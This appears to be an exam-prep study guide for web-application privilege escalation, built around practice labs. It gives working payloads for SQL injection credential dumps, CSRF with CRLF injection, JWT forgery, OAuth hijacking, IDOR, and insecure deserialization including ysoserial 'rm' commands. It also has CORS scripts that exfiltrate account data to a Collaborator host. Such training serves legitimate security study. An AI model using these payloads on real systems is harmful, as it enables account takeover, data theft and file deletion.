# Stage 2: Privilege Escalation

## Overview
Stage 2 focuses on escalating privileges from a regular user to administrator or stealing admin credentials/data.

## Common Vulnerability Locations

### 🔍 Advanced Search
- SQL Injection in search parameters
- Most common priv esc vector

### 👤 Profile Update
- JSON role manipulation
- Access control bypasses
- CSRF on email change

### 🍪 Cookies
- JWT manipulation
- Session token analysis
- Insecure deserialization

### 🔐 OAuth/Authentication
- OAuth flow manipulation
- 2FA bypasses

## Vulnerability Checklist

- [ ] SQL Injection in advanced search
- [ ] JSON roleId manipulation in profile
- [ ] CSRF on password/email change
- [ ] JWT signature bypass
- [ ] JWT header injection (jwk, jku, kid)
- [ ] OAuth redirect_uri manipulation
- [ ] Access control flaws (IDOR, role checks)
- [ ] Insecure deserialization in cookies

## Key Tools

- **SQLMap** - `--level 5 --risk 3` for comprehensive testing
- **JWT Editor** - Burp extension for JWT manipulation
- **Hackvertor** - For encoding bypasses

## Quick Tips

1. **Check for Advanced Search page** - High probability of SQL injection
2. **Inspect JSON in profile updates** - Look for `roleId`, `isAdmin` fields
3. **Test CSRF on email change** - Then reset admin password
4. **Analyze JWTs** - Check algorithm, signature, claims
5. **Use SQLMap** - Don't waste time on manual SQL injection

---

# SQL Injection

## 🎯 Target Location

**Primary Target:** Advanced Search Page ⭐⭐⭐

If you see an "Advanced Search" page on the exam, you're likely getting an easy privilege escalation via SQL injection.

## 🔥 Quick Win: SQLMap

**RECOMMENDED APPROACH:** Use SQLMap with aggressive settings

```bash
sqlmap -r request.txt --level 5 --risk 3 --batch --dump
```

### SQLMap Workflow

1. **Capture Request** - Save search request to `request.txt`
2. **Run SQLMap** - Use command above
3. **Extract Credentials** - SQLMap will dump admin username/password
4. **Login as Admin** - Use extracted credentials

**Why SQLMap?**
- Saves time (exam is time-limited)
- Handles complex injection scenarios
- Automatically extracts data
- Works while you check other vulnerabilities

## 📋 Manual Injection (If Needed)

### Basic Union-Based Injection
```sql
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
```

### Determine Column Count
```sql
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--
```

### Extract Database Info
```sql
' UNION SELECT table_name,NULL FROM information_schema.tables--
' UNION SELECT column_name,NULL FROM information_schema.columns WHERE table_name='users'--
```

### Extract User Data
```sql
' UNION SELECT username,password FROM users--
' UNION SELECT username || '~' || password,NULL FROM users--
```

## 🛡️ Special Cases

### XML-Based SQL Injection
**Context:** SQL injection in XML parameter (SQLMap won't work easily)

**Use Hackvertor Extension:**
```xml
<storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
```

## 🎓 Exam Tips

1. **Use SQLMap first** - `--level 5 --risk 3` for comprehensive testing
2. **Run while multitasking** - SQLMap runs in background, check other app
3. **Check Advanced Search** - Highest probability location
4. **Try TrackingId cookie** - Another common injection point
5. **Use Hackvertor for XML** - Essential for XML-based injection

---

# CSRF (Cross-Site Request Forgery)

## 🎯 Target Location

**Primary Target:** Email/Password Change Functionality

**Goal:** Change admin's email → Reset admin's password → Login as admin

## 📋 CSRF Bypass Techniques

### Lab 1: Token Validation Depends on Request Method
**Bypass:** Change POST to GET

**Original Request:**
```http
POST /my-account/change-email HTTP/1.1
Content-Type: application/x-www-form-urlencoded

email=attacker@evil.com&csrf=abc123
```

**Bypass:**
```http
GET /my-account/change-email?email=attacker@evil.com HTTP/1.1
```

---

### Lab 2: Token Validation Depends on Token Being Present
**Bypass:** Simply remove CSRF token

---

### Lab 3: Token Not Tied to User Session
**Bypass:** Use your own CSRF token for admin

---

### Lab 4: Token Tied to Non-Session Cookie
**Bypass:** Set victim's csrfKey cookie via CRLF injection

**Exploit:**
```html
<script>
location="https://vulnerable-site.com/?search=w;%0aSet-Cookie:+csrfKey=YOUR_KEY"
</script>
```

---

### Lab 5: Token Duplicated in Cookie
**Bypass:** Set both cookie and parameter to same value

**CRLF Injection:**
```
/?search=w%0d%0aSet-Cookie:%20csrf=kek%3b%20SameSite=None
```

---

### Lab 6: SameSite Lax Bypass via Method Override
**Bypass:** Use GET with `_method=POST` parameter

**Payload:**
```
/my-account/change-email?email=attacker@evil.com&_method=POST
```

---

### Lab 7: SameSite Strict Bypass via Client-Side Redirect
**Bypass:** Use path traversal in redirect parameter

**Payload:**
```
/post/comment/confirmation?postId=1../../../my-account/change-email?email=attacker@evil.com%26submit=1
```

## 🎓 Exam Tips

1. **Target email change functionality** - Most common CSRF location
2. **Try method change first** - POST → GET is easiest bypass
3. **Remove CSRF token** - Sometimes validation is optional
4. **Use Burp's CSRF PoC generator** - Saves time
5. **Combine with XSS** - CSRF + XSS = powerful attack

---

# JWT (JSON Web Tokens)

## 🎯 Overview

JWT attacks focus on manipulating the token structure, signature, or claims to escalate privileges.

## 🛠️ Essential Tools

**JWT Editor (Burp Extension)** - Essential for JWT manipulation

## 🔥 Attack Techniques

### Lab 1: Unverified Signature
**Bypass:** Server doesn't verify signature at all

**Steps:**
1. Decode JWT
2. Modify payload (e.g., `"sub": "administrator"`)
3. Keep signature as-is or remove it

---

### Lab 2: Flawed Signature Verification (Algorithm Confusion)
**Bypass:** Change `RS256` to `HS256`

**Steps:**
1. Get server's public key
2. Change `"alg": "RS256"` to `"alg": "HS256"`
3. Sign token with public key (using HS256)

---

### Lab 3: Weak Signing Key (Brute Force)
**Bypass:** Crack weak secret key

**Using hashcat:**
```bash
hashcat -a 0 -m 16500 <jwt> /path/to/wordlist.txt
```

---

### Lab 4: JWK Header Injection
**Bypass:** Inject your own public key in JWT header

**Steps:**
1. Generate RSA key pair
2. Modify JWT payload
3. Add `jwk` parameter to header with your public key
4. Sign with your private key

---

### Lab 5: JKU Header Injection
**Bypass:** Point to your own JWK Set URL

**Steps:**
1. Generate RSA key pair
2. Create JWK Set on exploit server
3. Modify JWT header with `jku` parameter
4. Sign with your private key

---

### Lab 6: KID Header Path Traversal
**Bypass:** Use path traversal in `kid` parameter

**Technique:**
```json
{
  "alg": "HS256",
  "typ": "JWT",
  "kid": "../../../../../../dev/null"
}
```

---

### Lab 7: Algorithm None
**Bypass:** Set algorithm to `none`

**Steps:**
1. Change `"alg": "HS256"` to `"alg": "none"`
2. Remove signature completely

## 🎓 Exam Tips

1. **Install JWT Editor extension** - Essential tool
2. **Check for `/jwks.json`** - Common key location
3. **Try algorithm confusion first** - RS256 → HS256
4. **Look for `kid` parameter** - Path traversal opportunity
5. **Test `none` algorithm** - Simple but effective

---

# OAuth Authentication

## 🎯 Target Location

**Primary Target:** Sign-in page with OAuth integration

## 🔥 Attack Techniques

### Lab 1: Authentication Bypass via Implicit Flow
**Bypass:** Modify email/username in POST request

**Attack Flow:**
1. Intercept OAuth authentication process
2. Find `/authenticate` POST request
3. Change to victim's credentials

---

### Lab 2: Forced OAuth Profile Linking
**Bypass:** CSRF on OAuth linking (missing `state` parameter)

**Attack Flow:**
1. Start OAuth linking process
2. Intercept `/oauth-linking?code=abc123` request
3. Generate CSRF PoC
4. Send to victim

---

### Lab 3: Account Hijacking via redirect_uri
**Bypass:** Manipulate `redirect_uri` to steal authorization code

**Attack Flow:**
1. Change `redirect_uri` to your server
2. Generate CSRF PoC
3. Send to victim
4. Check Burp Collaborator for code

---

### Lab 4: Stealing Access Tokens via Open Redirect
**Bypass:** Combine open redirect with OAuth

**Step 1:** Find open redirect
**Step 2:** Chain with OAuth redirect_uri
**Step 3:** Extract token from fragment identifier

## 🎓 Exam Tips

1. **Look for OAuth sign-in** - "Login with..." buttons
2. **Intercept entire OAuth flow** - Multiple requests involved
3. **Check for `state` parameter** - Missing = CSRF vulnerability
4. **Test `redirect_uri` validation** - Try your server

---

# Access Control Vulnerabilities

## 🎯 Overview

Access control vulnerabilities allow attackers to access resources or perform actions they shouldn't be authorized for.

## 🔥 Common Patterns

### Lab 1: User Role Modified in Profile
**Bypass:** JSON roleId manipulation

**Original Request:**
```http
POST /my-account HTTP/1.1
Content-Type: application/json

{
  "email": "user@example.com",
  "roleId": 1
}
```

**Exploit:**
```http
POST /my-account HTTP/1.1
Content-Type: application/json

{
  "email": "user@example.com",
  "roleId": 2
}
```

---

### Lab 2: URL-Based Access Control
**Bypass:** Change URL path or headers

**Bypass with X-Original-URL:**
```http
GET / HTTP/1.1
Host: vulnerable-site.com
X-Original-URL: /admin
```

---

### Lab 3: IDOR (Insecure Direct Object Reference)
**Bypass:** Change ID parameter

**Example:**
```http
GET /api/user/123/profile HTTP/1.1
```

Try:
```http
GET /api/user/1/profile HTTP/1.1
GET /api/user/admin/profile HTTP/1.1
```

## 🎓 Exam Tips

1. **Check JSON in profile updates** - Look for `roleId`, `isAdmin`
2. **Try X-Original-URL header** - Common bypass for URL-based controls
3. **Test IDOR on all ID parameters** - Try `1`, `admin`, `administrator`
4. **Add admin parameters** - `?admin=true`, `?isAdmin=1`

---

# CORS (Cross-Origin Resource Sharing)

## 🎯 Overview

CORS misconfigurations allow attackers to read sensitive data from another origin via JavaScript.

## 🔥 Attack Techniques

### Basic CORS Exploit
**Scenario:** Server reflects `Origin` header in `Access-Control-Allow-Origin`

**Exploit:**
```html
<script>
var xhr = new XMLHttpRequest();
xhr.onreadystatechange = function() {
  if (xhr.readyState == 4) {
    fetch('https://burp.oastify.com/?data=' + btoa(xhr.responseText));
  }
};
xhr.open('GET', 'https://vulnerable-site.com/accountDetails', true);
xhr.withCredentials = true;
xhr.send();
</script>
```

---

### Null Origin Bypass
**Scenario:** Server allows `null` origin

**Exploit (using iframe sandbox):**
```html
<iframe sandbox="allow-scripts" srcdoc="
<script>
var xhr = new XMLHttpRequest();
xhr.open('GET', 'https://vulnerable-site.com/accountDetails', true);
xhr.withCredentials = true;
xhr.onload = function() {
  fetch('https://burp.oastify.com/?data=' + btoa(xhr.responseText));
};
xhr.send();
</script>
"></iframe>
```



# Insecure Deserialization

## 🎯 Target Location

**Primary Target:** Session cookies (Base64-encoded serialized objects)

**Goal:** Modify serialized cookie to escalate privileges to administrator

## 🔍 Detection

### PHP Serialization Format
```
O:4:"User":2:{s:8:"username";s:6:"carlos";s:7:"isAdmin";b:0;}
```

**Format breakdown:**
- `O:4:"User"` - Object of class "User" (4 characters)
- `2:{}` - 2 properties
- `s:8:"username"` - String property "username" (8 characters)
- `s:6:"carlos"` - String value "carlos" (6 characters)
- `b:0` - Boolean value false

### Java Serialization Format
**Base64-encoded, starts with:** `rO0AB...`

**Binary signature:** `ac ed 00 05` (hex)

## 🔥 PHP Deserialization - Privilege Escalation

### Lab 1: Modifying Object Attributes
**Scenario:** Cookie contains serialized User object with `isAdmin` attribute

**Original Cookie (Base64-decoded):**
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:7:"isAdmin";b:0;}
```

**Modified (Escalate to Admin):**
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:7:"isAdmin";b:1;}
```

**Steps:**
1. Intercept request with session cookie
2. Base64-decode the cookie
3. Modify `isAdmin` from `b:0` to `b:1`
4. Update username to `administrator`
5. **IMPORTANT:** Update length indicators:
   - `s:6:"wiener"` → `s:13:"administrator"` (13 characters)
6. Base64-encode modified object
7. Replace cookie and send request

---

### Lab 2: Modifying Data Types (PHP Type Juggling)
**Scenario:** Loose comparison (`==`) used for password check

**Vulnerable Code:**
```php
$login = unserialize($_COOKIE);
if ($login['password'] == $password) {
    // log in successfully
}
```

**Original Cookie:**
```php
O:4:"User":2:{s:8:"username";s:6:"carlos";s:12:"access_token";s:32:"abc123..."}
```

**Exploit (Change string to integer 0):**
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

**Why it works:**
- PHP's loose comparison: `0 == "any_string"` evaluates to `true`
- Changing `s:32:"abc123..."` (string) to `i:0` (integer)
- **Note:** Only works on PHP 7.x and earlier

**Steps:**
1. Decode cookie
2. Change `access_token` from string (`s:32:"..."`) to integer (`i:0`)
3. Update length indicators
4. Re-encode and send

---

### Lab 3: Using Application Functionality (Magic Methods)
**Scenario:** Application has `__destruct()` magic method that deletes files

**Vulnerable Class:**
```php
class CustomTemplate {
    private $lock_file_path;
    
    function __destruct() {
        unlink($this->lock_file_path);
    }
}
```

**Exploit (Delete arbitrary file):**
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

**How it works:**
- `__destruct()` is called automatically when object is destroyed
- We control `lock_file_path` attribute
- File at that path gets deleted

**Steps:**
1. Identify class with dangerous magic method
2. Create serialized object with malicious attribute
3. Base64-encode and set as cookie
4. Trigger deserialization (page load)

---

## 🔥 Java Deserialization - Using ysoserial

### Prerequisites
```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Requires Java JDK 11+
```

### Lab 4: Exploiting Java Deserialization
**Scenario:** Session cookie contains Java serialized object

**Generate Payload (Delete file):**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | base64 -w 0
```

**With gzip compression:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 "rm /home/carlos/morale.txt" | gzip -f | base64 -w 0
```

**Common Gadget Chains:**
- `CommonsCollections1-7` - Apache Commons Collections
- `Spring1-2` - Spring Framework
- `Jdk7u21` - Java JDK
- `Hibernate1-2` - Hibernate ORM

**Steps:**
1. Identify Java serialization (cookie starts with `rO0AB`)
2. Generate payload with ysoserial
3. Replace cookie value with generated payload
4. Send request

---

### Detection Payloads (URLDNS)
**Use URLDNS chain for detection (works on any Java version):**

```bash
java -jar ysoserial-all.jar URLDNS "http://burp.oastify.com" | base64 -w 0
```

**How it works:**
- Triggers DNS lookup to your Burp Collaborator
- No specific vulnerable library required
- Universal detection method

---

## 🎓 Exam Tips

1. **Check cookies for Base64** - Decode to check for serialized objects
2. **Look for PHP format** - `O:4:"User":...` pattern
3. **Look for Java format** - Starts with `rO0AB` when base64-encoded
4. **Modify `isAdmin` or `roleId`** - Most common privilege escalation
5. **Update length indicators** - Critical for PHP serialization
6. **Use ysoserial for Java** - Don't waste time on manual gadget chains
7. **Try URLDNS first** - Universal Java deserialization detection

## 🔍 Testing Workflow

### Step 1: Identify Serialized Cookie
```bash
# Decode cookie
echo "TzoyOiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo3OiJpc0FkbWluIjtiOjA7fQ==" | base64 -d
```

### Step 2: Modify Object
```php
# Original
O:4:"User":2:{s:8:"username";s:6:"wiener";s:7:"isAdmin";b:0;}

# Modified
O:4:"User":2:{s:8:"username";s:13:"administrator";s:7:"isAdmin";b:1;}
```

### Step 3: Re-encode
```bash
echo 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:7:"isAdmin";b:1;}' | base64 -w 0
```

### Step 4: Replace Cookie and Test

## 📚 Common PHP Magic Methods

| Method | When Invoked | Use Case |
|--------|--------------|----------|
| `__construct()` | Object creation | Initialize attributes |
| `__destruct()` | Object destruction | Cleanup, file operations |
| `__wakeup()` | After `unserialize()` | Re-initialize object |
| `__toString()` | Object treated as string | String conversion |
| `__call()` | Undefined method called | Method overloading |

## 🔗 Quick Reference

| Language | Format | Detection |
|----------|--------|-----------|
| PHP | `O:4:"User":2:{...}` | Look for `O:` pattern |
| Java | Binary (base64) | Starts with `rO0AB` |
| Python | `pickle` format | Binary format |
| Ruby | Marshal format | Binary format |

---

# CORS (Cross-Origin Resource Sharing)

## 🎓 Exam Tips

1. **Check `/accountDetails` endpoint** - Common CORS misconfiguration location
2. **Test with arbitrary Origin** - See if reflected
3. **Try `null` origin** - Use iframe sandbox
4. **Combine with XSS** - XSS on subdomain + CORS = data theft
